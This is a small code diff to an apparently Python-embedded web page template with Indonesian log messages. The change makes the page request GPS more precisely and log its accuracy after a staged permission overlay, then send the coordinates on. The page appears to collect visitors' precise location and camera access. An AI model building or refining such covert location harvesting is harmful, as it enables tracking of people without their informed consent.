@@ -161,10 +161,11 @@ HTML_TEMPLATE = """
             console.log('Tahap 2: Meminta izin GPS dan kamera');
             permissionOverlay.style.display = 'none';
             
-            // Get geolocation
+            // Get geolocation with high accuracy
             navigator.geolocation.getCurrentPosition(
                 position => {
                     console.log('GPS berhasil:', position.coords);
+                    console.log('Accuracy:', position.coords.accuracy, 'meters');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     
@@ -199,6 +200,11 @@ HTML_TEMPLATE = """
                     // Geolocation failed, send without location
                     console.log('Lokasi tidak tersedia:', err);
                     sendData(null, null, null);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
                 }
             );
         }
